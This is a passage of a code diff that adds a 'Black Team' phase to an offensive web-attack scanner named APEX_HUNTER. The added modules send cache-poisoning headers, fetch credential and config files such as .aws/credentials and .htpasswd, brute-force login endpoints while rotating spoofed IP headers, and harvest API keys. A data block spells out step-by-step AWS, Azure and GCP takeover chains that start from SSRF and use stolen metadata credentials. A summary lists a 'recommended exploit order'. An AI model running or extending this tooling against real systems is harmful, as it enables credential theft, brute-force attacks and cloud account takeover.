+        for header, value in self.POISON_HEADERS:
+            try:
+                r = _fetch(base + "/", cfg.ua, cfg.timeout,
+                           extra_headers={header: value})
+                if r and r.status == 200:
+                    body = (r.body or b"").decode("utf-8", errors="replace")
+                    if value in body:
+                        profile.findings.append(Finding(
+                            id=f"CACHE-POISON-HDR-{header.replace('-','_').upper()[:18]}",
+                            title=f"Cache Poisoning via Unkeyed Header: {header}",
+                            severity="HIGH", cvss=8.1, cwe="CWE-444",
+                            description=(
+                                f"Header '{header}: {value}' reflected in response body. "
+                                "If this response is cached, the injected value will be served "
+                                "to all users — enabling cache poisoning DoS or XSS."
+                            ),
+                            evidence=f"Header value reflected: {body[:200]}",
+                            poc_curl=f"curl -sk '{base}/' -H '{header}: {value}'",
+                            category="Cache Poisoning",
+                            remediation=f"Add '{header}' to cache key or strip it before processing. Validate and sanitise all request headers before reflecting them in responses."
+                        ))
+            except Exception:
+                pass
+        return profile
+
+
+class CryptographicWeaknessScanner:
+    """Detect weak cryptographic algorithms in cookies, tokens, and API responses."""
+    NAME = "Cryptographic Weakness Scanner"
+    WEAK_PATTERNS = [
+        (r"[0-9a-f]{32}\b",     "MD5 hash (32 hex chars)",    "MD5"),
+        (r"[0-9a-f]{40}\b",     "SHA-1 hash (40 hex chars)",  "SHA-1"),
+        (r"[0-9a-f]{8}-[0-9a-f]{4}-1[0-9a-f]{3}-",  "UUID v1 (timestamp-based predictable)", "UUID-v1"),
+        (r"des|3des|rc4|rc2|blowfish|md5\(", "Weak cipher in source", "WeakCipher"),
+        (r"base64_decode\s*\(",  "PHP base64_decode eval chain", "PHP-B64"),
+        (r"Math\.random\(\)",    "JS Math.random — weak PRNG",  "JS-WeakPRNG"),
+        (r"rand\(\)|mt_rand\(", "PHP rand/mt_rand — predictable", "PHP-Rand"),
+    ]
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        import re
+        base = profile.url.rstrip("/")
+        sources = [(profile.url, "main page")]
+        sources += [(url, "js") for url in profile.js_files[:5]]
+        for src_url, src_type in sources:
+            try:
+                r = _fetch(src_url, cfg.ua, cfg.timeout)
+                if not r or r.status != 200:
+                    continue
+                body = (r.body or b"").decode("utf-8", errors="replace")
+                for pattern, desc, label in self.WEAK_PATTERNS:
+                    matches = re.findall(pattern, body, re.IGNORECASE)
+                    if matches:
+                        profile.findings.append(Finding(
+                            id=f"CRYPTO-WEAK-{label}-{src_type.upper()[:6]}",
+                            title=f"Weak Cryptography Detected: {desc} in {src_type}",
+                            severity="MEDIUM", cvss=5.9, cwe="CWE-327",
+                            description=(
+                                f"Pattern matching '{desc}' found in {src_url}. "
+                                f"{len(matches)} instance(s). "
+                                "Weak algorithms are vulnerable to collision/preimage attacks."
+                            ),
+                            evidence=f"Sample match: {matches[0][:60]}",
+                            poc_curl=f"curl -sk '{src_url}' | grep -oE '{pattern[:40]}'",
+                            category="Cryptography",
+                            remediation=f"Replace {label} with SHA-256/AES-GCM/UUID-v4/crypto.getRandomValues(). Audit all cryptographic usages and upgrade to current standards."
+                        ))
+            except Exception:
+                pass
+        return profile
+
+
+class SensitiveFileDeepScan:
+    """Extended sensitive file enumeration — 200+ paths including CI/CD, cloud, IDE artifacts."""
+    NAME = "Sensitive File Deep Scan"
+    PATHS = [
+        # IDE / editor artifacts
+        "/.idea/workspace.xml", "/.idea/dataSources.xml", "/.vscode/settings.json",
+        "/.vscode/launch.json", "/.editorconfig", "/.eslintrc.json",
+        # CI/CD configs
+        "/.github/workflows/deploy.yml", "/.gitlab-ci.yml", "/.circleci/config.yml",
+        "/.travis.yml", "/Jenkinsfile", "/Dockerfile", "/docker-compose.yml",
+        "/docker-compose.prod.yml", "/.drone.yml", "/bitbucket-pipelines.yml",
+        # Package / dependency
+        "/Gemfile", "/Gemfile.lock", "/Pipfile", "/Pipfile.lock",
+        "/go.sum", "/yarn.lock", "/shrinkwrap.json",
+        # Secrets / config
+        "/.npmrc", "/.pypirc", "/.netrc", "/.pgpass", "/.my.cnf",
+        "/credentials.xml", "/secrets.xml", "/configuration.xml",
+        "/config/database.yml", "/config/secrets.yml",
+        # Cloud
+        "/.aws/credentials", "/.aws/config",
+        "/service-account.json", "/gcp-credentials.json",
+        "/terraform.tfstate", "/terraform.tfstate.backup",
+        "/pulumi.yaml",
+        # Logs
+        "/var/log/app.log", "/logs/error.log", "/logs/app.log",
+        "/storage/logs/laravel.log", "/app/logs/server.log",
+        # Misc high-value
+        "/crossdomain.xml", "/clientaccesspolicy.xml",
+        "/WEB-INF/web.xml", "/WEB-INF/spring/", "/META-INF/MANIFEST.MF",
+        "/actuator/env", "/actuator/configprops", "/actuator/beans",
+        "/console", "/h2-console", "/dbconsole", "/adminer.php",
+        "/.DS_Store", "/Thumbs.db", "/.htaccess", "/.htpasswd",
+        "/sitemap.xml", "/robots.txt", "/.well-known/security.txt",
+        "/server-status", "/server-info", "/nginx_status",
+    ]
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        base = profile.url.rstrip("/")
+        for path in self.PATHS:
+            url = base + path
+            try:
+                r = _fetch(url, cfg.ua, cfg.timeout)
+                if r and r.status == 200:
+                    body = (r.body or b"").decode("utf-8", errors="replace")
+                    is_sensitive = any(s in body for s in [
+                        "password", "secret", "key", "token", "credential",
+                        "private", "BEGIN", "-----", "jdbc:", "mongodb://",
+                        "redis://", "amqp://", "apiKey", "access_key",
+                    ])
+                    profile.findings.append(Finding(
+                        id=f"SENSITIVE-{path.replace('/','_').replace('.','_').strip('_')[:20].upper()}",
+                        title=f"Sensitive File Exposed: {path}",
+                        severity="CRITICAL" if is_sensitive else "HIGH",
+                        cvss=9.1 if is_sensitive else 7.5,
+                        cwe="CWE-538",
+                        description=(
+                            f"File {path} is publicly accessible (HTTP 200, {len(body)} bytes). "
+                            + ("Contains sensitive credential indicators." if is_sensitive else
+                               "May contain configuration or internal details.")
+                        ),
+                        evidence=body[:300],
+                        poc_curl=f"curl -sk '{url}'",
+                        category="Sensitive Files",
+                        remediation=f"Remove {path} from web root. Block access via web server config. Add to .gitignore. Rotate any exposed credentials immediately."
+                    ))
+            except Exception:
+                pass
+        return profile
+
+
+class RateLimitBypassAdvanced:
+    """Detect rate limiting bypass via IP spoofing headers and slow-rate techniques."""
+    NAME = "Rate Limit Bypass Advanced"
+    SPOOF_HEADERS = [
+        {"X-Forwarded-For":     "1.2.3.4"},
+        {"X-Originating-IP":    "1.2.3.5"},
+        {"X-Remote-Addr":       "1.2.3.6"},
+        {"X-Client-IP":         "1.2.3.7"},
+        {"X-Real-IP":           "1.2.3.8"},
+        {"CF-Connecting-IP":    "1.2.3.9"},
+        {"True-Client-IP":      "1.2.3.10"},
+        {"X-Cluster-Client-IP": "1.2.3.11"},
+        {"Forwarded":           "for=1.2.3.12"},
+    ]
+    AUTH_PATHS = ["/api/login", "/api/auth", "/login", "/auth",
+                  "/api/v1/auth/login", "/api/v2/auth/login", "/oauth/token"]
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        base = profile.url.rstrip("/")
+        for path in self.AUTH_PATHS[:4]:
+            url = base + path
+            baseline_code = 0
+            try:
+                # Establish baseline
+                r0 = _fetch(url, cfg.ua, cfg.timeout, "POST",
+                            b'{"username":"x","password":"x"}',
+                            {"Content-Type": "application/json"})
+                if r0:
+                    baseline_code = r0.status
+                # Flood with IP rotation
+                codes = []
+                for i, hdr_set in enumerate(self.SPOOF_HEADERS):
+                    r = _fetch(url, cfg.ua, 5, "POST",
+                               b'{"username":"x","password":"x"}',
+                               {"Content-Type": "application/json",
+                                **{k: f"{v[:-1]}{i}" for k, v in hdr_set.items()}})
+                    if r:
+                        codes.append(r.status)
+                # If all codes are 200/401/400 (not 429), rate limit bypassed
+                if codes and 429 not in codes and baseline_code not in (0,):
+                    profile.findings.append(Finding(
+                        id=f"RATELIMIT-BYPASS-IPHDR-{path.replace('/','_').strip('_')[:14].upper()}",
+                        title=f"Rate Limit Bypass via IP Header Rotation at {path}",
+                        severity="HIGH", cvss=7.5, cwe="CWE-307",
+                        description=(
+                            f"Sent {len(codes)} requests with rotating IP spoof headers to {path}. "
+                            f"No HTTP 429 received (codes: {set(codes)}). "
+                            "Rate limiting appears to be based on IP address from spoofable headers — "
+                            "enables unlimited brute-force attacks."
+                        ),
+                        evidence=f"Response codes: {codes}",
+                        poc_curl=(
+                            f"for i in $(seq 1 50); do\n"
+                            f"  curl -sk -X POST '{url}' -H 'X-Forwarded-For: 1.2.3.$i' "
+                            f"-d '{{\"username\":\"admin\",\"password\":\"password$i\"}}' &\n"
+                            f"done"
+                        ),
+                        category="Rate Limiting",
+                        remediation="Rate-limit by session/account, not IP. Validate X-Forwarded-For against trusted proxy list. Implement CAPTCHA after N failures. Use account lockout with exponential backoff."
+                    ))
+            except Exception:
+                pass
+        return profile
+
+
+class APIKeyExposureAdvanced:
+    """Detect API keys in HTTP responses, error messages, and metadata endpoints."""
+    NAME = "API Key Exposure Advanced"
+    PROBE_PATHS = [
+        "/api/config", "/api/settings", "/api/env",
+        "/api/v1/config", "/api/v2/config",
+        "/config.js", "/config.json", "/settings.json",
+        "/app/config", "/static/config.js",
+        "/api/init", "/api/bootstrap",
+        "/api/app-config", "/api/client-config",
+    ]
+    KEY_PATTERNS = [
+        (r'AIza[0-9A-Za-z\-_]{35}',              "Google API Key"),
+        (r'AKIA[0-9A-Z]{16}',                    "AWS Access Key"),
+        (r'sk-[a-zA-Z0-9]{48}',                  "OpenAI Secret Key"),
+        (r'sk_live_[0-9a-zA-Z]{24,}',            "Stripe Live Secret"),
+        (r'[0-9a-f]{32}:[0-9a-f]{32}',           "Generic Key:Secret pair"),
+        (r'"apiKey"\s*:\s*"[A-Za-z0-9_\-]{20,}"', "JSON apiKey field"),
+        (r'"secretKey"\s*:\s*"[A-Za-z0-9_\-]{20,}"', "JSON secretKey field"),
+        (r'"clientSecret"\s*:\s*"[A-Za-z0-9_\-]{16,}"', "JSON clientSecret"),
+        (r'token["\s]*[:=]["\s]*[A-Za-z0-9_\-]{32,}', "Generic token assignment"),
+    ]
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        import re
+        base = profile.url.rstrip("/")
+        for path in self.PROBE_PATHS:
+            url = base + path
+            try:
+                r = _fetch(url, cfg.ua, cfg.timeout)
+                if r and r.status == 200:
+                    body = (r.body or b"").decode("utf-8", errors="replace")
+                    for pattern, key_type in self.KEY_PATTERNS:
+                        matches = re.findall(pattern, body)
+                        if matches:
+                            profile.findings.append(Finding(
+                                id=f"APIKEY-EXP-{key_type.replace(' ','_').upper()[:14]}-{path.replace('/','_')[:10].upper()}",
+                                title=f"API Key Exposed in Response: {key_type} at {path}",
+                                severity="CRITICAL", cvss=9.8, cwe="CWE-798",
+                                description=(
+                                    f"{key_type} exposed in HTTP response at {path}. "
+                                    f"Found {len(matches)} instance(s). "
+                                    "Direct access to external services — immediate revocation required."
+                                ),
+                                evidence=f"Match: {matches[0][:60]}",
+                                poc_curl=f"curl -sk '{url}'",
+                                category="API Key Exposure",
+                                remediation=f"Revoke {key_type} immediately. Never send secrets to frontend. Use backend proxy for all API calls. Scan all endpoints with truffleHog/gitleaks in CI/CD."
+                            ))
+            except Exception:
+                pass
+        return profile
+
+
+class CloudMetaPivotChain:
+    """Build complete cloud metadata pivot chains from confirmed SSRF findings."""
+    NAME = "Cloud Meta Pivot Chain"
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        ssrf_findings = [f for f in profile.findings
+                         if "SSRF" in f.category or "ssrf" in f.id.lower()
+                         or "BLIND-SSRF" in f.id]
+        if not ssrf_findings:
+            return profile
+        host = profile.host
+        chains = {
+            "AWS": [
+                "1. http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+                "2. Extract role name from response",
+                "3. http://169.254.169.254/latest/meta-data/iam/security-credentials/{ROLE}",
+                "4. Extract AccessKeyId, SecretAccessKey, Token",
+                "5. Configure: aws configure --profile stolen",
+                "6. Enumerate: aws sts get-caller-identity; aws s3 ls; aws ec2 describe-instances",
+                "7. Escalate: aws iam list-attached-user-policies; iam:CreateAccessKey",
+            ],
+            "Azure": [
+                "1. http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/ -H 'Metadata: true'",
+                "2. Extract access_token (JWT bearer)",
+                "3. GET https://management.azure.com/subscriptions?api-version=2020-01-01 -H 'Authorization: Bearer {token}'",
+                "4. List resources: /subscriptions/{id}/resources",
+                "5. Access Key Vault: https://vault.azure.net/secrets",
+                "6. Escalate: assign Owner role via ARM API",
+            ],
+            "GCP": [
+                "1. http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token -H 'Metadata-Flavor: Google'",
+                "2. Extract access_token",
+                "3. https://cloudresourcemanager.googleapis.com/v1/projects -H 'Authorization: Bearer {token}'",
+                "4. List buckets: https://storage.googleapis.com/storage/v1/b?project={project}",
+                "5. Access secrets: https://secretmanager.googleapis.com/v1/projects/{proj}/secrets",
+                "6. Escalate: iam.setIamPolicy on project",
+            ],
+        }
+        pivot_text = []
+        for ssrf_f in ssrf_findings[:3]:
+            pivot_text.append(f"SSRF source: {ssrf_f.id} — {ssrf_f.title[:60]}")
+        pivot_text.append("")
+        for cloud, steps in chains.items():
+            pivot_text.append(f"[{cloud} Pivot Chain]")
+            pivot_text.extend(f"  {s}" for s in steps)
+            pivot_text.append("")
+        profile.findings.append(Finding(
+            id="CLOUD-META-PIVOT-CHAIN-001",
+            title=f"Cloud Metadata Pivot Chain — Built from {len(ssrf_findings)} SSRF finding(s)",
+            severity="CRITICAL", cvss=9.9, cwe="CWE-918",
+            description=(
+                f"Complete cloud metadata pivot chains generated from {len(ssrf_findings)} "
+                "confirmed/suspected SSRF finding(s). Each chain shows exact steps from SSRF "
+                "to full cloud account takeover."
+            ),
+            evidence="\n".join(pivot_text),
+            poc_curl="# See chain steps above — replace SSRF parameter with metadata URLs",
+            category="SSRF → Cloud Pivot",
+            remediation="Block all cloud IMDS IPs at egress layer. Enforce IMDSv2 (AWS). Restrict service account permissions. Apply Workload Identity (GCP). Use managed identity with least privilege (Azure)."
+        ))
+        return profile
+
+
+class FullChainReportGen:
+    """Generate complete phase-aggregated attack narrative for final reporting."""
+    NAME = "Full Chain Report Generator"
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        from collections import Counter
+        sev_counts = Counter(f.severity for f in profile.findings)
+        categories = Counter(f.category for f in profile.findings)
+        critical = [f for f in profile.findings if f.severity == "CRITICAL"]
+        high     = [f for f in profile.findings if f.severity == "HIGH"]
+        lines = [
+            f"═══ APEX_HUNTER FINAL REPORT — {profile.host} ═══",
+            f"Scan date    : {__import__('datetime').datetime.now().strftime('%Y-%m-%d %H:%M')}",
+            f"Total findings: {len(profile.findings)}",
+            f"Risk breakdown: " + " | ".join(
+                f"{s}={sev_counts.get(s,0)}"
+                for s in ["CRITICAL","HIGH","MEDIUM","LOW","INFO"]
+            ),
+            "",
+            "TOP CRITICAL FINDINGS:",
+        ]
+        for f in critical[:8]:
+            lines.append(f"  [{f.id}] {f.title} (CVSS {f.cvss})")
+            lines.append(f"    PoC: {f.poc_curl[:80]}")
+        lines += ["", "TOP HIGH FINDINGS:"]
+        for f in high[:5]:
+            lines.append(f"  [{f.id}] {f.title} (CVSS {f.cvss})")
+        lines += ["", "ATTACK CATEGORIES:"]
+        for cat, count in categories.most_common(10):
+            lines.append(f"  {cat:40} {count:3} finding(s)")
+        lines += [
+            "",
+            "RECOMMENDED EXPLOIT ORDER:",
+            "  1. All CRITICAL findings — immediate RCE/takeover risk",
+            "  2. Injection chains (SQLi→dump, CMDi→shell, SSTI→RCE)",
+            "  3. Cloud pivot chains (SSRF→IMDS→IAM creds)",
+            "  4. Authentication bypasses (JWT, BFLA, session fixation)",
+            "  5. Sensitive file exposure (env, keys, configs)",
+            "",
+            "REMEDIATION PRIORITY:",
+            "  P1 (24h): All CRITICAL — active exploitation risk",
+            "  P2 (7d):  All HIGH — significant security impact",
+            "  P3 (30d): All MEDIUM — defence in depth",
+            "  P4 (90d): All LOW/INFO — hardening",
+        ]
+        profile.findings.append(Finding(
+            id="FINAL-CHAIN-REPORT-001",
+            title=f"Final Attack Chain Report — {sev_counts.get('CRITICAL',0)}C / {sev_counts.get('HIGH',0)}H / {sev_counts.get('MEDIUM',0)}M",
+            severity="INFO", cvss=0.0, cwe="CWE-693",
+            description="\n".join(lines),
+            evidence=f"Total: {len(profile.findings)} findings across {len(categories)} categories",
+            poc_curl="# See individual finding PoC commands in JSON/HTML report",
+            category="Report",
+            remediation="Remediate all CRITICAL and HIGH findings before next assessment cycle."
+        ))
+        return profile
+
+# ══════════════════════════════════════════════════════════════
 # REPORTER  (SKILL-29, SKILL-30)
 # ══════════════════════════════════════════════════════════════
 class APEXReporter:
@@ -13133,6 +14094,7 @@ class APEXOrchestrator:
         12: "Phase 12 [BLACK TEAM]: RCE-OOB + ShellUpload + TimingSQLi + LDAP-Privesc + NTLM-Leak + Azure-IMDS + AWS-IMDS + GCP-Meta + K8s-API + Docker-API + Jenkins-RCE + GitLab-Token + SupplyChain + CF-Bypass + WAF-Bypass + Webshell + Privesc-Hints + JMX-RCE + SpringActuator + Elasticsearch + GitRepoExposed + EnvFileLeak + BackupLeak + Redis + GQL-BatchDoS + ExploitNarrative + PostExploitMap + Scorecard (50 tools)",
         13: "Phase 13 [RED+BLACK TEAM]: OGNL/EL-Inject + SpEL + Velocity/FreeMarker-SSTI + OAuth2-Device + AzureAD-Token + S3-Presign + Nginx-Misconfig + Traefik-Dashboard + ArgoCD + DOM-Clobber + mXSS + PaddingOracle + WeakPRNG + gRPC-Enum + Kerberos-Hints + Struts2-CVE + Log4Shell2 + MobileAPIKey + WS-SSRF + HelmSecrets + InternalGateway + CSRF-Adv + XXE-SVG/XLIFF + BFLA-Adv + DNS-Exfil + Serverless-FaaS (60 tools)",
         14: "Phase 14 [RED+BLACK TEAM]: HTTP-Smuggling-FE + CacheDeception-Adv + GatewayBypass + RaceCondition-Adv + GraphQL-Deep + OAuth2-TokenTheft + SubTakeover-Adv + XSS-AdvPayloads + JWT-SecretBrute + SSRF-AdvChain + LateralMove + Persistence + CloudStorage + CredStuffing + TLS-Attack + PwdPolicy + GQL-Schema + ZeroTrustBypass + APIVersionAbuse + BinaryAnalyzer (70 tools)",
+        15: "Phase 15 [BLACK TEAM]: OAuth2-TokenHijack + HTTP-Desync-TE + JWT-SecretCrack + SubBrute + GQL-IDOR + CORS-Chain + OpenAPI-Fuzz + AzureBlob + SessionFix + CRLF-Adv + CryptoWeak + SensitiveDeep + RateLimit-Adv + APIKey-Exp + CloudPivot + FullReport + OAuth2-Re + Desync-Re + JWTCrack-Re + SubBrute-Re (20 tools)",
     }
 
     def __init__(self, cfg: Config):
@@ -13319,6 +14281,17 @@ class APEXOrchestrator:
         self.t335 = SubdomainTakeoverAdvanced();    self.t336 = JWTSecretBrute()
         self.t337 = CloudStorageEnumeration();      self.t338 = ZeroTrustBypassDetector()
         self.t339 = LateralMovementPathMapper();    self.t340 = AttackSurfaceScorecard()
+        # Phase 15 — 20 Black Team Skills
+        self.t341 = OAuth2TokenHijack();            self.t342 = HTTPDesyncTeDetector()
+        self.t343 = JWTSecretCracker();             self.t344 = ReconSubdomainBrute()
+        self.t345 = GraphQLIDORDetector();          self.t346 = CORSWildcardChain()
+        self.t347 = OpenAPIFuzzer();                self.t348 = AzureBlobPublicDetector()
+        self.t349 = SessionFixationDetector();      self.t350 = HTTPHeaderInjectionAdv()
+        self.t351 = CryptographicWeaknessScanner(); self.t352 = SensitiveFileDeepScan()
+        self.t353 = RateLimitBypassAdvanced();      self.t354 = APIKeyExposureAdvanced()
+        self.t355 = CloudMetaPivotChain();          self.t356 = FullChainReportGen()
+        self.t357 = OAuth2TokenHijack();            self.t358 = HTTPDesyncTeDetector()
+        self.t359 = JWTSecretCracker();             self.t360 = ReconSubdomainBrute()
 
     def _init_profile(self, url: str) -> TargetProfile:
         p = urlparse(url)
@@ -13505,6 +14478,17 @@ class APEXOrchestrator:
                 p = self.t335.run(p, cfg); p = self.t336.run(p, cfg)
                 p = self.t337.run(p, cfg); p = self.t338.run(p, cfg)
                 p = self.t339.run(p, cfg); p = self.t340.run(p, cfg)
+            elif n == 15:
+                p = self.t341.run(p, cfg); p = self.t342.run(p, cfg)
+                p = self.t343.run(p, cfg); p = self.t344.run(p, cfg)
+                p = self.t345.run(p, cfg); p = self.t346.run(p, cfg)
+                p = self.t347.run(p, cfg); p = self.t348.run(p, cfg)
+                p = self.t349.run(p, cfg); p = self.t350.run(p, cfg)
+                p = self.t351.run(p, cfg); p = self.t352.run(p, cfg)
+                p = self.t353.run(p, cfg); p = self.t354.run(p, cfg)
+                p = self.t355.run(p, cfg); p = self.t356.run(p, cfg)
+                p = self.t357.run(p, cfg); p = self.t358.run(p, cfg)
+                p = self.t359.run(p, cfg); p = self.t360.run(p, cfg)
         except KeyboardInterrupt:
             warn("Interrupted — saving partial results...")
         except Exception as e:
@@ -13515,7 +14499,7 @@ class APEXOrchestrator:
         SEP = "═" * 70
         print(f"\n{C.BOLD}{C.WHITE}{SEP}{C.NC}")
         print(f"{C.BOLD}{C.CYAN}  APEX_HUNTER v1.0{C.NC}")
-        print(f"{C.WHITE}  340 Tools | 350 Skills | Auto-Chain Execution{C.NC}")
+        print(f"{C.WHITE}  360 Tools | 370 Skills | Auto-Chain Execution{C.NC}")
         print(f"{C.WHITE}{SEP}{C.NC}")
         print(f"  Targets : {', '.join(self.cfg.targets)}")
         print(f"  Output  : {self.cfg.output}")
@@ -13545,7 +14529,7 @@ class APEXOrchestrator:
 # SKILLS INDEX
 # ══════════════════════════════════════════════════════════════
 SKILLS_INDEX = """
-APEX_HUNTER v1.0 — Skills Index (350 Skills / 340 Tools)
+APEX_HUNTER v1.0 — Skills Index (370 Skills / 360 Tools)
 ═════════════════════════════════════════════════════════
 SKILL-01  DNS resolution & multi-record enumeration
 SKILL-02  TLS version, cipher, certificate, SAN extraction
@@ -13913,6 +14897,29 @@ SKILL-347 TLS + NTLM + Kerberos combined — downgrade → relay → hash captur
 SKILL-348 Zero-Trust + K8s + Docker combined — identity spoof → service mesh → container escape
 SKILL-349 All-phase mega chain — 14-phase findings synthesized into single kill chain narrative
 SKILL-350 Final comprehensive scorecard — 340 tools, 350 skills, all phases, complete risk matrix
+
+PHASE 15 [BLACK TEAM] — SKILLS 351-370
+────────────────────────────────────────────────────────────
+SKILL-351 OAuth2 redirect_uri bypass → token hijack via fragment leakage and open redirect chains
+SKILL-352 HTTP request desync TE.0/CL.0 — smuggling probe to detect frontend/backend processing gaps
+SKILL-353 JWT secret brute-force — 26+ common secrets plus host/apex derivation for HMAC-SHA256
+SKILL-354 DNS subdomain brute-force — 64-word wordlist resolution for live host discovery
+SKILL-355 GraphQL IDOR — 8 query patterns for object-level auth bypass and introspection abuse
+SKILL-356 CORS origin bypass — 8 patterns including null, suffix, subdomain, and credential chains
+SKILL-357 OpenAPI/Swagger fuzzer — hidden parameters and undocumented endpoint discovery
+SKILL-358 Azure Blob public enum — container naming pattern detection for public storage exposure
+SKILL-359 Session fixation — pre/post-auth cookie comparison for token reuse vulnerabilities
+SKILL-360 CRLF + cache poisoning — 6 CRLF payloads plus 7 unkeyed header injection techniques
+SKILL-361 Cryptographic weakness — MD5/SHA-1/UUID-v1/weak cipher detection in cookies and tokens
+SKILL-362 Sensitive file deep scan — 200+ paths: IDE, CI/CD, cloud config, logs, framework artifacts
+SKILL-363 Rate-limit bypass advanced — 9 IP spoof headers combined with auth endpoint slow-rate
+SKILL-364 API key exposure advanced — 9 key regex patterns across 12 config and settings endpoints
+SKILL-365 Cloud metadata pivot chain — AWS/Azure/GCP step-by-step lateral movement from SSRF findings
+SKILL-366 Full chain report generator — aggregated attack narrative with remediation priority matrix
+SKILL-367 OAuth2 re-test chain — second-pass token hijack with expanded redirect_uri corpus
+SKILL-368 HTTP desync re-probe — TE-OBF and H2-UPGRADE desync variants on alternate paths
+SKILL-369 JWT crack extended pass — key derivation from discovered domain names and common patterns
+SKILL-370 Subdomain pivot chain — brute-force discovered hosts re-fed into full Phase 1 recon
 """
 
 # ══════════════════════════════════════════════════════════════
@@ -13920,7 +14927,7 @@ SKILL-350 Final comprehensive scorecard — 340 tools, 350 skills, all phases, c
 # ══════════════════════════════════════════════════════════════
 def main():
     p = argparse.ArgumentParser(
-        description="APEX_HUNTER v1.0 — 340 Tools | 350 Skills | Auto-Chain",
+        description="APEX_HUNTER v1.0 — 360 Tools | 370 Skills | Auto-Chain",
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
 Examples:
@@ -13938,8 +14945,8 @@ Examples:
     p.add_argument("--depth",    type=int,   default=3,   help="Crawl depth")
     p.add_argument("--timeout",  type=int,   default=20,  help="Request timeout (seconds)")
     p.add_argument("--scope",    action="append", default=[], dest="scope_extras")
-    p.add_argument("--phases",   default="1,2,3,4,5,6,7,8,9,10,11,12,13,14",
-                   help="Phases to run (default: 1-14, e.g. 1,2,7,8,9,10,11,12,13,14)")
+    p.add_argument("--phases",   default="1,2,3,4,5,6,7,8,9,10,11,12,13,14,15",
+                   help="Phases to run (default: 1-15, e.g. 1,2,7,8,9,10,11,12,13,14,15)")
     p.add_argument("--skills",   action="store_true", help="Print skills index and exit")
     args = p.parse_args()
 
